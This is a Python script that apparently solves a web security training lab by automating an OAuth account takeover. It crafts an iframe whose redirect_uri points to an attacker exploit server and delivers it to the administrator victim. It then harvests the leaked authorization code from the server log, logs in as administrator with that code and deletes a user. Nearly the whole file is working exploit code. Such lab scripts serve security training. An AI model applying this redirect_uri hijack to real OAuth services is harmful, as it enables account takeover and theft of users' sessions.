#!/usr/bin/env python3

import requests
import re
import sys
import time
import urllib3
from urllib.parse import urlparse, parse_qs
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

WIENER_USER = "wiener"
WIENER_PASS = "peter"


def get_exploit_host(s, url):
    r = s.get(f"{url}/", verify=False, proxies=proxies, timeout=10)
    soup = BeautifulSoup(r.text, "html.parser")
    link = soup.find("a", attrs={"id": "exploit-link"})
    if not link:
        return None
    return link["href"].rstrip("/")


OAUTH_URL_RE = re.compile(r"https://oauth-[a-z0-9]+\.oauth-server\.net/auth\?[^\"'<>\s]+")


def get_oauth_link(s, url):
    r = s.get(f"{url}/my-account", verify=False, proxies=proxies, timeout=10)
    soup = BeautifulSoup(r.text, "html.parser")

    link = soup.find("a", href=re.compile(r"oauth-server\.net/auth"))
    if link:
        return link["href"]

    match = OAUTH_URL_RE.search(r.text)
    if match:
        return match.group(0)

    print("[-] Could not locate OAuth link. First 800 chars of /my-account:")
    print(r.text[:800])
    return None


def parse_oauth_details(oauth_link):
    oauth_url = urlparse(oauth_link)
    oauth_host = f"{oauth_url.scheme}://{oauth_url.netloc}"
    params = parse_qs(oauth_url.query)
    client_id = params.get("client_id", [None])[0]
    return oauth_host, client_id


def login_via_oauth(s, url, oauth_link, username, password):
    r = s.get(oauth_link, verify=False, proxies=proxies, timeout=10)
    interaction_url = r.url

    data = {"username": username, "password": password}
    r = s.post(f"{interaction_url}/login", data=data,
               verify=False, proxies=proxies, timeout=10)
    if "/confirm" not in r.text:
        print(f"[-] Failed to reach confirmation page (status {r.status_code}, "
              f"final url {r.url})")
        print(r.text[:800])
        return False
    s.post(f"{interaction_url}/confirm", verify=False, proxies=proxies, timeout=10)
    r = s.get(f"{url}/my-account", verify=False, proxies=proxies, timeout=10)
    return f"Your username is: {username}" in r.text


def build_exploit_html(oauth_host, client_id, exploit_host):
    auth_url = (
        f"{oauth_host}/auth?client_id={client_id}"
        f"&redirect_uri={exploit_host}"
        f"&response_type=code&scope=openid%20profile%20email"
    )
    return f'<iframe src="{auth_url}"></iframe>'


def store_exploit(s, exploit_host, html_body):
    data = {
        "urlIsHttps": "on",
        "responseFile": "/exploit",
        "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
        "responseBody": html_body,
        "formAction": "STORE",
    }
    r = s.post(exploit_host, data=data, verify=False, proxies=proxies, timeout=10)
    return r.status_code == 200


def deliver_to_victim(s, exploit_host):
    r = s.get(f"{exploit_host}/deliver-to-victim", allow_redirects=False,
              verify=False, proxies=proxies, timeout=10)
    return r.status_code == 302


def get_leaked_code(s, exploit_host):
    r = s.get(f"{exploit_host}/log", verify=False, proxies=proxies, timeout=10)
    matches = re.findall(r'[?&]code=([^&\s"<]+)', r.text)
    return matches[-1] if matches else None


def hijack_with_code(s, url, code):
    s.get(f"{url}/oauth-callback", params={"code": code},
          verify=False, proxies=proxies, timeout=10)
    r = s.get(f"{url}/my-account", verify=False, proxies=proxies, timeout=10)
    return "Your username is: administrator" in r.text


def delete_carlos(s, url):
    r = s.get(f"{url}/admin/delete?username=carlos", allow_redirects=False,
               verify=False, proxies=proxies, timeout=10)
    return r.status_code == 302


def check_solved(s, url, retries=5, delay=1.5):
    for attempt in range(retries):
        r = s.get(f"{url}/", verify=False, proxies=proxies, timeout=10)
        if "Congratulations" in r.text:
            print("[+] Lab solved!")
            return True
        if attempt < retries - 1:
            time.sleep(delay)
    print("[-] Lab not solved yet")
    return False


def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <URL>")
        sys.exit(0)

    url = sys.argv[1].strip().rstrip("/")
    s = requests.Session()

    exploit_host = get_exploit_host(s, url)
    if not exploit_host:
        print("[-] Failed to find exploit server link")
        return False
    print(f"[+] Found exploit server: {exploit_host}")

    oauth_link = get_oauth_link(s, url)
    if not oauth_link:
        print("[-] Failed to find 'Login with social media' link")
        return False
    oauth_host, client_id = parse_oauth_details(oauth_link)
    if not oauth_host or not client_id:
        print("[-] Failed to parse oauth-server host or client_id")
        return False
    print(f"[+] OAuth host: {oauth_host}, client_id: {client_id}")

    if not login_via_oauth(s, url, oauth_link, WIENER_USER, WIENER_PASS):
        print("[-] Login failed")
        return False
    print("[+] Logged in as wiener")

    exploit_html = build_exploit_html(oauth_host, client_id, exploit_host)

    if not store_exploit(s, exploit_host, exploit_html):
        print("[-] Failed to store exploit")
        return False
    print("[+] Stored exploit")

    if not deliver_to_victim(s, exploit_host):
        print("[-] Failed to deliver exploit to victim")
        return False
    print("[+] Delivered exploit to victim (admin)")

    time.sleep(2)

    code = get_leaked_code(s, exploit_host)
    if not code:
        print("[-] Failed to find a leaked authorization code in the access log")
        return False
    print(f"[+] Stole admin's authorization code: {code}")

    s.get(f"{url}/logout", allow_redirects=False, verify=False, proxies=proxies, timeout=10)
    print("[+] Logged out as wiener")

    if not hijack_with_code(s, url, code):
        print("[-] Failed to hijack the administrator session")
        return False
    print("[+] Logged in as administrator using the stolen code")

    if not delete_carlos(s, url):
        print("[-] Failed to delete carlos")
        return False
    print("[+] Deleted carlos")

    check_solved(s, url)

if __name__ == "__main__":
    main()